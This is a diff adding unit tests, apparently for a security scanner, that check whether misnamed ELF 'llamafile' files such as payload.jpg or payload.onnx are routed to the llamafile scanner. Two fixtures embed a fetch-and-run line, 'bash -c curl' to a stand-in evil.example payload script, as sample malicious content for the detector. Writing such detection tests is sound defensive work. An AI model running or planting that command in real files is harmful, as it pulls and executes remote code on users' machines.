@@ -609,8 +609,39 @@ def test_get_scanner_for_path_routes_extensionless_malicious_llamafile(tmp_path:
     _assert_scanner_for_path(llamafile_path, "llamafile")
 
 
+def test_get_scanner_for_path_routes_misnamed_malicious_llamafile(tmp_path: Path) -> None:
+    llamafile_path = tmp_path / "payload.jpg"
+    llamafile_path.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
+def test_get_scanner_for_path_prioritizes_llamafile_over_onnx_suffix(tmp_path: Path) -> None:
+    llamafile_path = tmp_path / "payload.onnx"
+    llamafile_path.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
 def test_get_scanner_for_path_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
     generic_executable = tmp_path / "tool"
+    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
+
+    assert ScannerRegistry().get_scanner_for_path(str(generic_executable)) is None
+
+
+def test_get_scanner_for_path_does_not_route_misnamed_llamafile_near_match(tmp_path: Path) -> None:
+    generic_executable = tmp_path / "tool.jpg"
     generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
 
     assert ScannerRegistry().get_scanner_for_path(str(generic_executable)) is None
